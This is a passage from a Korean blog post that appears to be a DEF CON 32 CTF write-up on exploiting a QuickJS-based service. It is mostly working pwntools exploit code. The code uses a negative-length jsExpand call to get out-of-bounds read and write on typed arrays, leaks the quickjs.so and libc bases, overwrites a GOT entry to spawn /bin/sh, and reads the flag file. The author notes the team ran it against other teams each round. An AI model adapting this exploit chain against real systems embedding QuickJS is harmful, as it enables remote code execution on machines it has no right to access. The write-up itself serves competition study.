</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;let b = new Float64Array(4); b[0] = 1.1; b[1] = 2.2; b[2] = 3.3; jsExpand(b, -1); b[13] = i64_to_f64(</span><span style="color:#e6db74">{</span>(libc_got)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffffffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, </span><span style="color:#e6db74">{</span>libc_got <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span><span style="color:#e6db74">}</span><span style="color:#e6db74">); b[0] = i64_to_f64(</span><span style="color:#e6db74">{</span>(libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x50d70</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffffffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, </span><span style="color:#e6db74">{</span>libc_base <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span><span style="color:#e6db74">}</span><span style="color:#e6db74">); &#34;/bin/sh&#34;;&#39;</span>)
</span></span><span style="display:flex;"><span>    sleep(<span style="color:#ae81ff">0.5</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;undefined&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;-1&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xfb</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;cat /fla? | base64&#39;</span>)
</span></span><span style="display:flex;"><span>    flag <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(p<span style="color:#f92672">.</span>recvline()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])<span style="color:#f92672">.</span>decode()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> flag
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(exploit(<span style="color:#e6db74">&#39;localhost&#39;</span>, <span style="color:#ae81ff">9999</span>))
</span></span></code></pre></div><p>하지만 위 방식의 익스플로잇 코드는 로컬 환경에선 동작했지만 대회장에 가서는 동작하지 않았다.<br>
두 번째 익스플로잇처럼 수정했다면 동작했을 수 있었겠지만, 익스플로잇 수정이 완료되었을 시간엔 거의 패치가 완료되었을 것이라 생각했기에 바로 두번째 익스플로잇을 이용했다.</p>
<h2 id="exploit-without-dmesg">exploit without dmesg<a hidden class="anchor" aria-hidden="true" href="#exploit-without-dmesg">#</a></h2>
<p>첫 번째 익스플로잇을 짜다가 발견했던 type 정보 생략을 이용해서 메모리 릭도 자체적으로 수행할 수 있을 것이라고 생각했다.<br>
function을 정의해서 할당 관련 함수를 힙에 남기고 이를 릭해서 quickjs.so의 base를 얻을 수 있었다.<br>
대회장에선 동작을 안해서 좀 더 안정적으로 만들기 위해 element pointer를 quickjs.so의 got로 변조해서 libc의 base를 얻도록 수정했다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>(ip: str, port: int) <span style="color:#f92672">-&gt;</span> str <span style="color:#f92672">|</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># r_info = remote(ip, port)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># r_info.recvline()</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># r_info.recvuntil(&#39;telnet &#39;)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># ip, port = r_info.recvline()[:-1].split()</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># port = int(port)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> remote(ip, port)
</span></span><span style="display:flex;"><span>    sleep(<span style="color:#ae81ff">3</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;let memory = new ArrayBuffer(8); let view_u32 = new Uint32Array(memory); let view_f64 = new Float64Array(memory); let view_u8 = new Uint8Array(memory);&#39;</span>)
</span></span><span style="display:flex;"><span>    sleep(<span style="color:#ae81ff">0.5</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;let a = new Float64Array(4); a[0] = 1.1; a[1] = 2.2; a[2] = 3.3; jsExpand(a, -1);&#39;</span>)
</span></span><span style="display:flex;"><span>    sleep(<span style="color:#ae81ff">0.5</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;let b = new Float64Array(4); b[0] = 1.1; b[1] = 2.2; b[2] = 3.3; jsExpand(b, -1); console.log(&#34;lk:&#34;+b[13]);&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;lk:&#39;</span>)
</span></span><span style="display:flex;"><span>    lk <span style="color:#f92672">=</span> float(p<span style="color:#f92672">.</span>recvline()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
</span></span><span style="display:flex;"><span>    object_elemnt_ptr <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#39;&lt;Q&#39;</span>, struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;d&#39;</span>, lk))[<span style="color:#ae81ff">0</span>] 
</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>success(hex(object_elemnt_ptr))
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;let f = () =&gt; {return 1;};&#39;</span>)
</span></span><span style="display:flex;"><span>    sleep(<span style="color:#ae81ff">0.5</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;console.log(&#34;lk:&#34;+b[</span><span style="color:#e6db74">{</span><span style="color:#ae81ff">0x48</span><span style="color:#e6db74">}</span><span style="color:#e6db74">]);&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;lk:&#39;</span>)
</span></span><span style="display:flex;"><span>    lk <span style="color:#f92672">=</span> float(p<span style="color:#f92672">.</span>recvline()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
</span></span><span style="display:flex;"><span>    quickjs_base <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#39;&lt;Q&#39;</span>, struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;d&#39;</span>, lk))[<span style="color:#ae81ff">0</span>] 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> quickjs_base <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>        log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;leak failed. retrying ...&#39;</span>)
</span></span><span style="display:flex;"><span>        sleep(<span style="color:#ae81ff">0.5</span>)
</span></span><span style="display:flex;"><span>        p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;c = console.log; console.log(&#34;lk:&#34;+b[</span><span style="color:#e6db74">{</span><span style="color:#ae81ff">0x4e</span><span style="color:#e6db74">}</span><span style="color:#e6db74">]);&#39;</span>)
</span></span><span style="display:flex;"><span>        p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;lk:&#39;</span>)
</span></span><span style="display:flex;"><span>        lk <span style="color:#f92672">=</span> float(p<span style="color:#f92672">.</span>recvline()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
</span></span><span style="display:flex;"><span>        quickjs_base <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#39;&lt;Q&#39;</span>, struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;d&#39;</span>, lk))[<span style="color:#ae81ff">0</span>] 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> quickjs_base <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">10</span>):
</span></span><span style="display:flex;"><span>                log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;trying - </span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>                sleep(<span style="color:#ae81ff">0.3</span>)
</span></span><span style="display:flex;"><span>                p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;c = console.log; console.log(&#34;lk:&#34;+b[</span><span style="color:#e6db74">{</span><span style="color:#ae81ff">0x48</span> <span style="color:#f92672">+</span> i<span style="color:#e6db74">}</span><span style="color:#e6db74">]);&#39;</span>)
</span></span><span style="display:flex;"><span>                p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;lk:&#39;</span>)
</span></span><span style="display:flex;"><span>                lk <span style="color:#f92672">=</span> float(p<span style="color:#f92672">.</span>recvline()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
</span></span><span style="display:flex;"><span>                quickjs_base <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#39;&lt;Q&#39;</span>, struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;d&#39;</span>, lk))[<span style="color:#ae81ff">0</span>] 
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> quickjs_base <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xf30</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xf30</span>:
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">assert</span> quickjs_base <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    quickjs_base <span style="color:#f92672">-=</span> <span style="color:#ae81ff">0xff30</span>
</span></span><span style="display:flex;"><span>    quickjs_got <span style="color:#f92672">=</span> quickjs_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xa9068</span> <span style="color:#75715e"># free </span>
</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>success(hex(quickjs_got))
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> remote(ip, port)
</span></span><span style="display:flex;"><span>    sleep(<span style="color:#ae81ff">3</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;let memory = new ArrayBuffer(8); let view_u32 = new Uint32Array(memory); let view_f64 = new Float64Array(memory); let view_u8 = new Uint8Array(memory); function i64_to_f64(low, high) {view_u32[0] = low; view_u32[1] = high; return view_f64[0];};&#39;</span>)
</span></span><span style="display:flex;"><span>    sleep(<span style="color:#ae81ff">0.5</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;let a = new Float64Array(4); a[0] = 1.1; a[1] = 2.2; a[2] = 3.3; jsExpand(a, -1);&#39;</span>)
</span></span><span style="display:flex;"><span>    sleep(<span style="color:#ae81ff">0.5</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;let b = new Float64Array(4); b[0] = 1.1; b[1] = 2.2; b[2] = 3.3; jsExpand(b, -1); b[13] = i64_to_f64(</span><span style="color:#e6db74">{</span>(quickjs_got)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffffffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, </span><span style="color:#e6db74">{</span>quickjs_got <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span><span style="color:#e6db74">}</span><span style="color:#e6db74">); console.log(&#34;lk:&#34;+b[0]);&#39;</span>)
</span></span><span style="display:flex;"><span>    sleep(<span style="color:#ae81ff">0.5</span>)<span style="color:#75715e"># = i64_to_f64({(libc_base + 0x50d70)&amp;0xffffffff}, {libc_base &gt;&gt; 32}); &#34;/bin/sh&#34;;</span>
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;lk:&#39;</span>)
</span></span><span style="display:flex;"><span>    lk <span style="color:#f92672">=</span> float(p<span style="color:#f92672">.</span>recvline()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
</span></span><span style="display:flex;"><span>    libc_base <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#39;&lt;Q&#39;</span>, struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;d&#39;</span>, lk))[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">-</span> <span style="color:#ae81ff">0xa53e0</span>
</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>success(hex(libc_base))
</span></span><span style="display:flex;"><span>    libc_got <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x21a098</span>
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> remote(ip, port)
</span></span><span style="display:flex;"><span>    sleep(<span style="color:#ae81ff">3</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;let memory = new ArrayBuffer(8); let view_u32 = new Uint32Array(memory); let view_f64 = new Float64Array(memory); let view_u8 = new Uint8Array(memory); function i64_to_f64(low, high) {view_u32[0] = low; view_u32[1] = high; return view_f64[0];};&#39;</span>)
</span></span><span style="display:flex;"><span>    sleep(<span style="color:#ae81ff">0.5</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;let a = new Float64Array(4); a[0] = 1.1; a[1] = 2.2; a[2] = 3.3; jsExpand(a, -1);&#39;</span>)
</span></span><span style="display:flex;"><span>    sleep(<span style="color:#ae81ff">0.5</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;let b = new Float64Array(4); b[0] = 1.1; b[1] = 2.2; b[2] = 3.3; jsExpand(b, -1); b[13] = i64_to_f64(</span><span style="color:#e6db74">{</span>(libc_got)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffffffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, </span><span style="color:#e6db74">{</span>libc_got <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span><span style="color:#e6db74">}</span><span style="color:#e6db74">); b[0] = i64_to_f64(</span><span style="color:#e6db74">{</span>(libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x50d70</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffffffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, </span><span style="color:#e6db74">{</span>libc_base <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span><span style="color:#e6db74">}</span><span style="color:#e6db74">); &#34;/bin/sh&#34;;&#39;</span>)
</span></span><span style="display:flex;"><span>    sleep(<span style="color:#ae81ff">0.5</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;undefined&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;-1&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xfb</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># p.sendline(&#39;rev /flag&#39;)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># p.sendline(&#34;cat /flag&#34;)</span>
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>interactive()
</span></span><span style="display:flex;"><span><span style="color:#75715e"># context.log_level=&#39;debug&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
</span></span><span style="display:flex;"><span>(exploit(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;10.10.</span><span style="color:#e6db74">{</span>sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">.1&#39;</span>, int(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>])))
</span></span></code></pre></div><p><img loading="lazy" src="/blog/DEFCON_32_cloud_cache-Quickjs_exploitation/e1984dde2de61b1ba18fea92027fde1f.png" alt=""  />
<br>
<img loading="lazy" src="/blog/DEFCON_32_cloud_cache-Quickjs_exploitation/24e81fef68818f92515cc69b97e5d6eb.png" alt=""  />
<br>
이런식으로 매 라운드마다 팀원분들과 함께 열심히 다른팀에 쐈다.<br>
이거 말고도 몇 가지 quickjs 1-day도 다 먹혔다고 하는데 시간이 없어서 1-day 익스는 짜지 못했다.</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://msh1307.kr/tags/defcon-ctf/">DEFCON CTF</a></li>
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2025 <a href="https://msh1307.kr">msh1307</a></span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
